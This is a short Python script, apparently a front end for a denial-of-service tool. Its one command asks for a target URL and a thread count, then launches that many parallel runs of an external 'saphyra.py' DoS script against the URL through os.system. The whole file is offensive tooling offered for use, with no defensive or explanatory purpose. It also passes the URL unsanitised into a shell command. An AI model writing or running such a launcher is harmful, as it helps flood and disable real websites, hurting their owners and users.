import threading
import os


def DoS_Saphyra(url):
    os.system(f"python DoS\saphyra.py {url}")

def command(cmd : str):
    if cmd == "dos saphyra":
        print("---- DoS Saphyra ----")
        url = str(input("URL : "))
        _threading = int(input("Thread : "))
        for _ in range(_threading):
            t = threading.Thread(target=DoS_Saphyra, args=(url,))
            t.start()

def listen():
    cmd = str(input("$ "))
    return cmd


while True:
    command(listen())
